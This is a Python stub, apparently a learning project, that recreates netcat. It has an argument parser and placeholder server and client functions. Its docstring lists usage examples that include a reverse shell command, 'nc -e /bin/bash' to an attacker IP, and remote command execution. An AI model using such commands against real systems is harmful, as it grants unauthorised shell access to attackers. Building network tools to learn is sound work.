#!/bin/python3

"""
subject: Recreate netcat (administration swiss knife tool)

For this project, i want to implement just some type of netcat:
	- basic client server communication:
		* listener : nc -lvp <Port>
		* connect : nc <IP_Address> <Port>
	
	- file upload and download:
		* upload : nc <Receiver_IP> <Port> < file.txt
		* download : nc -lvp <Port> > file.txt
	
	- reverse shell and command execution
		* reverse shell : nc -e /bin/bash <Attacker_IP> <Port>
		* command execution : nc -c whoami <Attacker_IP> <Port>
"""
import sys
import subprocess

def	isOption(arg):
	if (arg[0] != "-"):
		return (False)
	isPTEC = 0
	for char in arg[1:]:
		if char not in "lvptec":
			print("Error: option not supported")
			sys.exit(1)
		if char in "ptec":
			isPTEC += 1
		if isPTEC > 1:
			print("Error: invalid option")
			sys.exit(1)
	return (True)

def	parser():
	argLen = len(sys.argv)
	if argLen < 3:
		print("Error: insufficient number of arguments")
		sys.exit(1)
	args = {
		"LISTENNING":False,
		"VERBOSE":False,
		"PORT":"",
		"IP":"",
		"CMD":""
	}
	i = 1
	while i < argLen:
		arg = sys.argv[i]
		if isOption(arg):
			if "l" in arg:
				if args["LISTENNING"] == True:
					print("Error: repetitive argument")
					sys.exit(1)
				args["LISTENNING"] = True
			if "v" in arg:
				if args["VERBOSE"] == True:
					print("Error: repetitive argument")
					sys.exit(1)
				args["VERBOSE"] = True
			if "p" in arg:
				if args["PORT"] != "":
					print("Error: repetitive argument")
					sys.exit(1)
				if i + 1 >= argLen:
					print("Error: Insufficient number of argument")
					sys.exit(1)
				args["PORT"] = sys.argv[i + 1]
				i += 1
			elif "t" in arg:
				if args["IP"] != "":
					print("Error: repetitive argument")
					sys.exit(1)
				if i + 1 >= argLen:
					print("Error: Insufficient number of argument")
					sys.exit(1)
				args["IP"] = sys.argv[i + 1]
				i += 1
			elif "c" in arg or "e" in arg:
				if args["CMD"] != "":
					print("Error: repetitive argument")
					sys.exit(1)
				if i + 1 >= argLen:
					print("Error: Insufficient number of argument")
					sys.exit(1)
				args["CMD"] = sys.argv[i + 1]
				i += 1
		else:
			if args["IP"] == "":
				args["IP"] = arg
			if args["PORT"] == "":
				args["PORT"] = arg
		i += 1
	return (args)

def checkArgs(args):
	if args["PORT"] == "" and args["IP"] == "":
		print("Error: No port and IP")
		sys.exit(1)
	if args["LISTENNING"] and args["PORT"] == "":
		print("Error: no port to listen on")
		sys.exit(1)

def	execute_cmd():
	print("execute cmd")

def	server():
	print("server")

def client():
	print("client")

def main():
	print("main")

if __name__ == "__main__":
	args = parser()
	print(args)
	checkArgs(args)
